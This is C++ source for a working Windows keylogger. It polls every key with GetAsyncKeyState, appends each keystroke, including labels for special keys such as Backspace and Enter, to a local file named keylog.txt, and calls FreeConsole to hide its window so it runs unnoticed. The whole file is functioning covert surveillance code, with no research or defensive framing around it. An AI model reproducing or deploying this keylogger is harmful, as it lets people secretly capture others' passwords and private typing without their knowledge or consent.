#include <iostream>
#include <fstream>
#include <windows.h>
#include <chrono>
#include <thread>

using namespace std;

// Function to log keys to a file
void logKey(int key) {
    ofstream logFile;
    logFile.open("keylog.txt", ios::app); // Append to the file

    // Check for special keys
    if (key == VK_BACK)
        logFile << "[BACKSPACE]";
    else if (key == VK_RETURN)
        logFile << "[ENTER]";
    else if (key == VK_SHIFT)
        logFile << "[SHIFT]";
    else if (key == VK_TAB)
        logFile << "[TAB]";
    else if (key == VK_CAPITAL)
        logFile << "[CAPS LOCK]";
    else if (key == VK_SPACE)
        logFile << " ";
    else if (key == VK_ESCAPE)
        logFile << "[ESC]";
    else if (key >= 0x30 && key <= 0x5A) // Alphanumeric keys
        logFile << char(key);
    else
        logFile << "[" << key << "]";

    logFile.close();
}

// Main keylogging function
void keyLogger() {
    bool keys[256] = { false }; // Array to track pressed keys

    while (true) {
        for (int key = 8; key <= 255; key++) {
            // Check if the key is currently pressed
            if (GetAsyncKeyState(key) & 0x8000) {
                if (key == VK_ESCAPE) {
                    return;
                }
                // If the key is not already logged
                if (!keys[key]) {
                    logKey(key);         // Log the key
                    keys[key] = true;    // Mark the key as pressed
                }
            } else {
                // If the key is released, mark it as not pressed
                keys[key] = false;
            }
        }
        // Optional: Sleep for a small period to limit CPU usage
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

int main() {
    FreeConsole();  // Hides the console window
    keyLogger();    // Start logging keys
    return 0;
}
